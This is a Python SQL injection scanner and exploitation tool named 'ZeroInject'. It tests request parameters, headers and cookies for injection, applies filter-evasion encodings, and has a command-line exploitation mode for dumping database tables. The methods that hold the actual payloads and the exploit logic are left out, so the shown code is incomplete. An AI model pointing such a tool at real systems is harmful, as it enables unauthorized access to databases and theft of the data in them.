#!/usr/bin/env python3
"""
ZeroInject - SQL Injection Module for ZeroScope
Author: Your Name
Date: YYYY-MM-DD
"""

import argparse
import requests
import urllib.parse
import time
import re
import json
import base64
from typing import Dict, List, Optional, Tuple, Union

class ZeroInject:
    def __init__(self, target_url: str, verbose: bool = False):
        self.target_url = target_url
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'ZeroInject/1.0',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })
        self.vulnerable_params = []
        self.dbms = None
        self.injection_points = []
        self.tamper_scripts = {
            'base64': lambda x: urllib.parse.quote_plus(base64.b64encode(x.encode()).decode()),
            'hex': lambda x: ''.join([f'%{ord(c):02x}' for c in x]),
            'doubleurl': lambda x: urllib.parse.quote_plus(urllib.parse.quote_plus(x))
        }

    def _make_request(self, method: str, params: Dict[str, str]) -> Optional[requests.Response]:
        """
        Make HTTP request with given parameters
        """
        try:
            if method == 'GET':
                return self.session.get(self.target_url, params=params)
            elif method == 'POST':
                return self.session.post(self.target_url, data=params)
            else:
                return None
        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"[-] Request failed: {e}")
            return None

    def detect(self, params: Dict[str, str] = None, headers: Dict[str, str] = None, 
               cookies: Dict[str, str] = None, tamper: str = None) -> bool:
        """
        Detect SQL injection vulnerabilities with optional tampering
        """
        print(f"[*] Scanning {self.target_url} for SQLi vulnerabilities")
        
        # Test GET parameters
        if '?' in self.target_url:
            url_parts = urllib.parse.urlparse(self.target_url)
            query_params = urllib.parse.parse_qs(url_parts.query)
            for param in query_params:
                if self._test_param(param, 'GET', query_params, tamper):
                    self.vulnerable_params.append((param, 'GET'))
                    self.injection_points.append(('GET', param))

        # Test POST parameters
        if params:
            for param in params:
                if self._test_param(param, 'POST', params, tamper):
                    self.vulnerable_params.append((param, 'POST'))
                    self.injection_points.append(('POST', param))

        # Test headers
        if headers:
            for header in headers:
                if self._test_header(header, headers, tamper):
                    self.vulnerable_params.append((header, 'HEADER'))
                    self.injection_points.append(('HEADER', header))

        # Test cookies
        if cookies:
            for cookie in cookies:
                if self._test_cookie(cookie, cookies, tamper):
                    self.vulnerable_params.append((cookie, 'COOKIE'))
                    self.injection_points.append(('COOKIE', cookie))

        return len(self.vulnerable_params) > 0

    # ... [rest of the class implementation remains the same] ...

def main():
    parser = argparse.ArgumentParser(
        description="ZeroInject - Advanced SQL Injection Scanner",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--detect", action="store_true", help="Run detection mode")
    parser.add_argument("--exploit", action="store_true", help="Run exploitation mode")
    parser.add_argument("--db", help="Database name for exploitation")
    parser.add_argument("--table", help="Table name for exploitation")
    parser.add_argument("--column", help="Column name for exploitation")
    parser.add_argument("--dump", action="store_true", help="Dump data from specified column")
    parser.add_argument("--limit", type=int, default=10, help="Limit rows to dump (default: 10)")
    parser.add_argument("--tamper", help="Tamper script to use (base64, hex, doubleurl)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--output", help="Output file path")
    parser.add_argument("--format", choices=['text', 'json', 'md'], default='text',
                        help="Output format (default: text)")

    args = parser.parse_args()

    print(r"""
     _____              ___           _       _     
    |__  /___ _ __ ___ |_ _|_ __  ___| |_ ___| |__  
      / // _ \ '_ ` _ \ | || '_ \/ __| __/ __| '_ \ 
     / /|  __/ | | | | | || | | \__ \ || (__| | | |
    /____\___|_| |_| |_|___|_| |_|___/\__\___|_| |_|
    """)

    scanner = ZeroInject(args.url, args.verbose)

    if args.detect:
        print("[*] Starting SQLi detection...")
        if scanner.detect(tamper=args.tamper):
            print("[+] SQL Injection vulnerabilities found!")
            for param, method in scanner.vulnerable_params:
                print(f"    - {method} parameter: {param}")
                if scanner.dbms:
                    print(f"        DBMS: {scanner.dbms}")
        else:
            print("[-] No SQL Injection vulnerabilities detected")

    if args.exploit:
        if not scanner.vulnerable_params:
            print("[-] No vulnerable parameters found. Running detection first...")
            if not scanner.detect(tamper=args.tamper):
                print("[-] No SQLi vulnerabilities found to exploit")
                return

        print("[*] Starting exploitation...")
        result = scanner.exploit(
            injection_point=scanner.injection_points[0],
            db=args.db,
            table=args.table,
            column=args.column,
            dump=args.dump,
            limit=args.limit
        )

        if result:
            print("[+] Exploitation successful!")
            for key, values in result.items():
                print(f"\n{key.upper()}:")
                for value in values:
                    print(f"    - {value}")

            if args.output:
                scanner.save_results(result, args.output, args.format)

if __name__ == "__main__":
    main()
